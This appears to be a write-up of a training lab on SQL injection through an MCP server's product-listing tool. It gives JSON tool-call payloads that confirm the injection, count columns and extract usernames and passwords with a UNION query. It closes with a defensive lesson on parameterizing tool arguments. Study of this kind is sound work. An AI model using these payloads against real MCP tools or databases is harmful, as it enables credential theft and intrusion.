# SQL Injection in an MCP Server Tool

## Lab

**Name:** SQL injection in an MCP server tool
**Goal:** Find the administrator credentials and use them to solve the lab.

## Vulnerable Endpoint

The shop exposes an MCP server at `/mcp`. After initializing the server, list the available tools.

```json
{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
```

The lab exposes a `list_products` tool that accepts a `category` argument.

## Exploitation

### 1. Confirm SQL injection

A single quote produces an application error:

```json
{
  "name": "list_products",
  "arguments": {
    "category": "Gifts'"
  }
}
```

The tool call fails to list products.

### 2. Confirm the Boolean behavior

```json
{
  "name": "list_products",
  "arguments": {
    "category": "Gifts' OR 1=1--"
  }
}
```

This payload returns products, confirming that user input is inserted into a SQL query.

### 3. Determine the number of columns

The following payload identifies a valid two-column `UNION` query:

```json
{
  "name": "list_products",
  "arguments": {
    "category": "Gifts' UNION SELECT NULL,NULL--"
  }
}
```

### 4. Extract usernames and passwords

The lab uses a PostgreSQL `users` table:

```json
{
  "name": "list_products",
  "arguments": {
    "category": "Gifts' UNION SELECT username,password FROM users--"
  }
}
```

The returned data includes an administrator account and password.

## Completion

Log in through `/login` using the extracted administrator credentials. The lab status should change to solved.

## Key Takeaway

MCP tools can expose the same vulnerabilities as ordinary application endpoints. Tool arguments must be parameterized and validated before being passed to database queries.
